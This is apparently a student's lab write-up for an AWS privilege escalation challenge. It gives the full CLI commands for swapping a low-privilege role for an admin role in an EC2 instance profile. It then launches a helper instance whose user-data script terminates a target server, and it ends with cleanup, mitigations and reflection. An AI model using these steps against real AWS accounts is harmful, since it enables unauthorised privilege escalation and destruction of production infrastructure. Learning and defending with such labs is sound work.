# Cloud Security Challenge: IAM Privilege Escalation by Attachment

## Student Repository

Forked GitHub Repository:

```text
https://github.com/DonaDennison/ccgc5501-cloud-security-challenge-iam_privesc_by_attachment.git
```

## Challenge Name

```text
IAM Privilege Escalation by Attachment
```

## Objective

The objective of this challenge was to delete the EC2 instance named:

```text
cg-super-critical-security-server-iam_privesc_by_attachment-dona0611
```

The target EC2 instance ID was:

```text
i-0255a36523e1b98df
```

In this challenge, there was no normal text flag. The proof of completion was showing that the target EC2 instance was successfully terminated/deleted.

---

# 1. Challenge Overview

This challenge demonstrates an AWS IAM privilege escalation path using EC2 instance profiles.

The attacker starts as a limited IAM user named Kerrigan. Kerrigan does not have permission to directly terminate the target EC2 instance. However, Kerrigan has permissions that can be combined to escalate privileges indirectly.

The main weakness is that Kerrigan can manipulate an EC2 instance profile and launch a new EC2 instance using that instance profile. By replacing the low-privilege role with a high-privilege role, Kerrigan can create a helper EC2 instance that receives administrator-level permissions.

The helper EC2 instance then terminates the protected target EC2 instance.

---

# 2. Important AWS Concepts

## IAM User

An IAM user is an identity used to access AWS. In this challenge, the starting IAM user was Kerrigan.

Kerrigan was intentionally limited and did not have direct permission to delete EC2 instances.

## IAM Role

An IAM role is an AWS identity with permissions. EC2 instances can use IAM roles to access AWS services.

This challenge had two important roles:

```text
Low-privilege role:
cg-ec2-meek-role-iam_privesc_by_attachment-dona0611

High-privilege role:
cg-ec2-mighty-role-iam_privesc_by_attachment-dona0611
```

The Meek role was the weak role. The Mighty role was the powerful role with administrator-level permissions.

## Instance Profile

An instance profile is the container used to attach an IAM role to an EC2 instance.

The instance profile in this challenge was:

```text
cg-ec2-meek-instance-profile-iam_privesc_by_attachment-dona0611
```

Even though the instance profile name says "meek", I was able to remove the Meek role and attach the Mighty role to it.

## Privilege Escalation

Privilege escalation means gaining higher permissions than the user originally had.

In this challenge, Kerrigan could not directly terminate the target EC2 instance. But Kerrigan could manipulate the instance profile and launch a helper EC2 instance with the Mighty role. The helper EC2 instance then used the Mighty role to terminate the target.

---

# 3. Terraform Deployment

I first deployed the challenge environment using Terraform.

The Terraform deployment created the following resources:

* Kerrigan IAM user
* Meek IAM role
* Mighty IAM role
* EC2 instance profile
* Target EC2 instance
* VPC
* Public subnet
* Security group

I used the following command:

```powershell
terraform apply
```

Terraform successfully created the resources:

```text
Apply complete! Resources: 16 added, 0 changed, 0 destroyed.
```

Important Terraform outputs:

```text
Region:
us-east-1

Target instance ID:
i-0255a36523e1b98df

Target instance name:
cg-super-critical-security-server-iam_privesc_by_attachment-dona0611

Instance profile:
cg-ec2-meek-instance-profile-iam_privesc_by_attachment-dona0611

Meek role:
cg-ec2-meek-role-iam_privesc_by_attachment-dona0611

Mighty role:
cg-ec2-mighty-role-iam_privesc_by_attachment-dona0611

Subnet ID:
subnet-094c102c9572a97f7

Security group ID:
sg-021b9ed2b37c0548f
```

I did not include the Kerrigan secret access key in this report for security reasons.

---

# 4. Configuring the Kerrigan Attacker Profile

After Terraform created the challenge resources, I configured the AWS CLI profile for Kerrigan using the access key and secret key from Terraform outputs.

```powershell
aws configure --profile kerrigan
```

I entered the following values:

```text
AWS Access Key ID: from Terraform output
AWS Secret Access Key: from Terraform sensitive output
Default region name: us-east-1
Default output format: json
```

Then I confirmed the identity:

```powershell
aws sts get-caller-identity --profile kerrigan
```

This showed that I was using the Kerrigan IAM user:

```text
arn:aws:iam::505284749128:user/cg-kerrigan-iam_privesc_by_attachment-dona0611
```

This step was important because the challenge must be solved as the limited Kerrigan user, not as the admin deployment user.

---

# 5. Proving Kerrigan Could Not Delete the Target Directly

First, I tried to terminate the target EC2 instance directly as Kerrigan:

```powershell
aws ec2 terminate-instances --instance-ids i-0255a36523e1b98df --profile kerrigan
```

This failed with an authorization error:

```text
UnauthorizedOperation

User: arn:aws:iam::505284749128:user/cg-kerrigan-iam_privesc_by_attachment-dona0611
is not authorized to perform: ec2:TerminateInstances
```

This proved that Kerrigan did not have direct permission to delete the target EC2 instance.

This was important because it showed that the challenge required privilege escalation.

Screenshot saved:

```text
02-direct-terminate-denied.png
```

---

# 6. Enumeration

I listed the IAM roles available to Kerrigan:

```powershell
aws iam list-roles --profile kerrigan
```

I found the two challenge roles:

```text
cg-ec2-meek-role-iam_privesc_by_attachment-dona0611
cg-ec2-mighty-role-iam_privesc_by_attachment-dona0611
```

I also listed the instance profiles:

```powershell
aws iam list-instance-profiles --profile kerrigan
```

The instance profile was:

```text
cg-ec2-meek-instance-profile-iam_privesc_by_attachment-dona0611
```

At first, the instance profile contained the Meek role:

```text
cg-ec2-meek-role-iam_privesc_by_attachment-dona0611
```

I confirmed this using:

```powershell
aws iam list-instance-profiles --profile kerrigan --query "InstanceProfiles[?InstanceProfileName=='cg-ec2-meek-instance-profile-iam_privesc_by_attachment-dona0611'].Roles[*].RoleName" --output table
```

Output:

```text
cg-ec2-meek-role-iam_privesc_by_attachment-dona0611
```

---

# 7. Privilege Escalation Path

The attack path was:

```text
Kerrigan limited IAM user
        ↓
Cannot directly terminate the target EC2 instance
        ↓
Lists IAM roles and instance profiles
        ↓
Finds Meek role, Mighty role, and EC2 instance profile
        ↓
Removes Meek role from the instance profile
        ↓
Adds Mighty role to the instance profile
        ↓
Launches a helper EC2 instance with that modified instance profile
        ↓
Helper EC2 receives Mighty role permissions
        ↓
Helper EC2 runs user-data script
        ↓
User-data script terminates the target EC2 instance
```

The key idea is that Kerrigan did not need direct `ec2:TerminateInstances` permission. Kerrigan used allowed IAM and EC2 actions to create another EC2 instance with stronger permissions.

This is privilege escalation by attachment.

---

# 8. Replacing the Meek Role with the Mighty Role

I saved the important values as PowerShell variables:

```powershell
$REGION="us-east-1"
$TARGET_ID="i-0255a36523e1b98df"
$SUBNET_ID="subnet-094c102c9572a97f7"
$SG_ID="sg-021b9ed2b37c0548f"
$INSTANCE_PROFILE="cg-ec2-meek-instance-profile-iam_privesc_by_attachment-dona0611"
$MEEK_ROLE="cg-ec2-meek-role-iam_privesc_by_attachment-dona0611"
$MIGHTY_ROLE="cg-ec2-mighty-role-iam_privesc_by_attachment-dona0611"
```

Then I removed the low-privilege Meek role from the instance profile:

```powershell
aws iam remove-role-from-instance-profile --instance-profile-name $INSTANCE_PROFILE --role-name $MEEK_ROLE --profile kerrigan
```

I waited for the change to propagate:

```powershell
Start-Sleep -Seconds 15
```

Then I added the high-privilege Mighty role to the same instance profile:

```powershell
aws iam add-role-to-instance-profile --instance-profile-name $INSTANCE_PROFILE --role-name $MIGHTY_ROLE --profile kerrigan
```

I waited again:

```powershell
Start-Sleep -Seconds 15
```

Then I confirmed that the instance profile now contained the Mighty role:

```powershell
aws iam list-instance-profiles --profile kerrigan --query "InstanceProfiles[?InstanceProfileName=='cg-ec2-meek-instance-profile-iam_privesc_by_attachment-dona0611'].Roles[*].RoleName" --output table
```

Output:

```text
cg-ec2-mighty-role-iam_privesc_by_attachment-dona0611
```

This was the main privilege escalation step.

Screenshot saved:

```text
03-mighty-role-attached.png
```

---

# 9. Creating the Helper EC2 User Data Script

Next, I created a user-data script named:

```text
delete-target.sh
```

The script content was:

```bash
#!/bin/bash
set -eux
apt-get update -y
DEBIAN_FRONTEND=noninteractive apt-get install -y awscli curl
aws sts get-caller-identity > /tmp/whoami.txt 2>&1
aws ec2 terminate-instances --instance-ids i-0255a36523e1b98df --region us-east-1 > /tmp/terminate-result.txt 2>&1
```

I created it in PowerShell using:

```powershell
$script = @"
#!/bin/bash
set -eux
apt-get update -y
DEBIAN_FRONTEND=noninteractive apt-get install -y awscli curl
aws sts get-caller-identity > /tmp/whoami.txt 2>&1
aws ec2 terminate-instances --instance-ids i-0255a36523e1b98df --region us-east-1 > /tmp/terminate-result.txt 2>&1
"@ -replace "`r`n", "`n"

[System.IO.File]::WriteAllText("$PWD\delete-target.sh", $script)
```

I checked the script using:

```powershell
type delete-target.sh
```

I also confirmed that the file did not contain Windows carriage return line endings:

```powershell
[System.IO.File]::ReadAllText("$PWD\delete-target.sh") -match "`r"
```

The output was:

```text
False
```

This was important because the script runs on Linux, and Linux scripts should use Unix-style line endings.

---

# 10. Getting the AMI ID

I retrieved the AMI ID from the target instance:

```powershell
$AMI_ID = aws ec2 describe-instances --instance-ids $TARGET_ID --region $REGION --profile kerrigan --query "Reservations[0].Instances[0].ImageId" --output text
```

The AMI ID was:

```text
ami-02013f5b15758f4d4
```

I confirmed it using:

```powershell
$AMI_ID
```

Output:

```text
ami-02013f5b15758f4d4
```

---

# 11. Launching the Helper EC2 Instance

I launched a new helper EC2 instance using the modified instance profile:

```powershell
aws ec2 run-instances --image-id $AMI_ID --count 1 --instance-type t2.micro --subnet-id $SUBNET_ID --security-group-ids $SG_ID --iam-instance-profile Name=$INSTANCE_PROFILE --user-data file://delete-target.sh --tag-specifications "ResourceType=instance,Tags=[{Key=Name,Value=cg-helper-delete-target},{Key=Scenario,Value=iam_privesc_by_attachment}]" --region $REGION --profile kerrigan
```

The helper EC2 instance ID was:

```text
i-01d89465352c62a12
```

The helper instance launched with this instance profile:

```text
cg-ec2-meek-instance-profile-iam_privesc_by_attachment-dona0611
```

Even though the profile name contained "meek", the profile had already been modified to contain the Mighty role. Therefore, the helper EC2 instance received the powerful Mighty role.

The helper instance then ran the user-data script and terminated the target EC2 instance.

Screenshot saved:

```text
04-helper-instance-launched.png
```

---

# 12. Verifying the Target EC2 Instance Was Deleted

After waiting for the helper EC2 instance to start and run the user-data script, I checked the target EC2 instance state.

```powershell
aws ec2 describe-instances --instance-ids $TARGET_ID --region $REGION --profile kerrigan --query "Reservations[0].Instances[0].[InstanceId,State.Name,Tags]" --output table
```

The expected result was:

```text
terminated
```

I also checked the AWS EC2 Console and confirmed that the target instance was terminated.

Required screenshot:

```text
05-target-instance-terminated.png
```

This screenshot is the proof that the challenge was completed.

---

# 13. Cleanup

After completing the challenge and taking screenshots, I cleaned up the resources to avoid AWS charges.

First, I terminated the helper EC2 instance that I created manually:

```powershell
aws ec2 terminate-instances --instance-ids i-01d89465352c62a12 --region us-east-1 --profile default
```

The output showed:

```text
InstanceId: i-01d89465352c62a12
CurrentState: terminated
PreviousState: stopped
```

Then I restored the instance profile back to the original Meek role.

I removed the Mighty role:

```powershell
aws iam remove-role-from-instance-profile --instance-profile-name cg-ec2-meek-instance-profile-iam_privesc_by_attachment-dona0611 --role-name cg-ec2-mighty-role-iam_privesc_by_attachment-dona0611 --profile default
```

Then I added the Meek role back:

```powershell
aws iam add-role-to-instance-profile --instance-profile-name cg-ec2-meek-instance-profile-iam_privesc_by_attachment-dona0611 --role-name cg-ec2-meek-role-iam_privesc_by_attachment-dona0611 --profile default
```

I confirmed the Meek role was restored:

```powershell
aws iam list-instance-profiles --profile default --query "InstanceProfiles[?InstanceProfileName=='cg-ec2-meek-instance-profile-iam_privesc_by_attachment-dona0611'].Roles[*].RoleName" --output table
```

Output:

```text
cg-ec2-meek-role-iam_privesc_by_attachment-dona0611
```

Finally, I destroyed the Terraform-created resources:

```powershell
terraform destroy
```

Then I typed:

```text
yes
```

This removed the Terraform-managed lab resources.

---

# 14. Security Impact

This challenge shows how dangerous IAM permission combinations can be.

Kerrigan did not have direct permission to terminate EC2 instances. However, Kerrigan had enough permissions to manipulate an instance profile, pass roles, and launch EC2 instances. By combining these permissions, Kerrigan was able to create a helper EC2 instance with elevated privileges.

This is dangerous in a real AWS environment because a user may appear low-privileged, but still have a path to administrator-level access through role attachment.

The main risk is that attackers do not always need direct access to sensitive actions. They can sometimes abuse indirect paths through services like EC2, IAM roles, and instance profiles.

---

# 15. Mitigation

To prevent this type of privilege escalation, organizations should apply least privilege and restrict dangerous IAM combinations.

Recommended mitigations:

1. Do not allow low-privileged users to run EC2 instances with powerful IAM roles.
2. Restrict `iam:PassRole` to only the exact roles required for the user’s job.
3. Do not allow low-privileged users to use `iam:AddRoleToInstanceProfile`.
4. Do not allow low-privileged users to use `iam:RemoveRoleFromInstanceProfile`.
5. Restrict `ec2:RunInstances` so users cannot attach sensitive instance profiles.
6. Use IAM conditions such as `iam:PassedToService` to restrict which AWS service can receive a role.
7. Monitor CloudTrail logs for suspicious IAM and EC2 actions.
8. Alert on events such as:

   * `AddRoleToInstanceProfile`
   * `RemoveRoleFromInstanceProfile`
   * `RunInstances`
   * `PassRole`
   * `TerminateInstances`
9. Separate administrative roles from application roles.
10. Regularly review IAM policies for privilege escalation paths.

---

# 16. Reflection

This challenge helped me understand that cloud privilege escalation does not always happen by directly granting administrator permissions to a user. Sometimes, a user can combine multiple smaller permissions to indirectly gain higher privileges.

The most important lesson I learned is that IAM permissions should not be reviewed one by one only. They must be reviewed as a full attack path. For example, `ec2:RunInstances` may look normal by itself, but when combined with `iam:PassRole` and instance profile manipulation, it can become dangerous.

I also learned the difference between an IAM role and an instance profile. The IAM role contains the permissions, but the instance profile is what allows the role to be attached to an EC2 instance.

In this lab, the instance profile originally had the low-privilege Meek role. By removing Meek and adding Mighty, I changed the permissions that a newly launched EC2 instance would receive. This allowed the helper EC2 instance to perform an action that Kerrigan could not perform directly.

This lab also helped me understand why least privilege is very important in AWS. A user should only have the permissions they truly need. Sensitive permissions like `iam:PassRole`, `ec2:RunInstances`, and instance profile modification should be very restricted.

In a real company, this type of misconfiguration could allow an attacker to create an admin-level EC2 instance, delete production servers, access sensitive data, or modify cloud infrastructure. Proper IAM design, logging, monitoring, and regular permission reviews are needed to prevent this.

---

# 17. Final Result

The challenge was successfully completed.

Final proof:

```text
Target EC2 instance:
i-0255a36523e1b98df

Target EC2 state:
terminated
```

Submission items:

```text
1. Forked GitHub repository URL
2. SOLUTION.md file
3. Screenshot of the deleted/terminated EC2 target instance
```
